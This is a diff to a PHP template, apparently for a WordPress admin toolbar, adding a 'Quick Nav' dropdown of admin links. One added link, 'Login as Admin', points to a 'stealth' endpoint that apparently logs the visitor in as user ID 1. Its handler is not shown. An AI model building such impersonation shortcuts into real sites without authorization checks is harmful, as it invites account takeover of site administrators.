@@ -32,8 +32,23 @@ if ( ! defined( 'ABSPATH' ) ) {
                     echo "</li>";
                 }
                 ?>
+                <div class="nav-item dropdown me-2">
+                    <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown"
+                       aria-expanded="false">
+                        Quick Nav
+                    </a>
+                    <ul class="dropdown-menu dropdown-menu-end">
+                        <li><a class="dropdown-item" href="<?php echo admin_url('post-new.php'); ?>" target="_blank">Create New Post</a></li>
+                        <li><a class="dropdown-item" href="<?php echo admin_url('plugins.php'); ?>" target="_blank">Plugins</a></li>
+                        <li><a class="dropdown-item" href="<?php echo admin_url('themes.php'); ?>" target="_blank">Themes</a></li>
+                        <li><a class="dropdown-item" href="/stealth/stealth.php?stealth_page=login&login_as_uid=1&redirect=1" target="_blank">Login as Admin</a></li>
+                    </ul>
+                </div>
             </ul>
 
+
+
+            
             <div class="nav-item dropdown">
                 <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
                     &#8942;
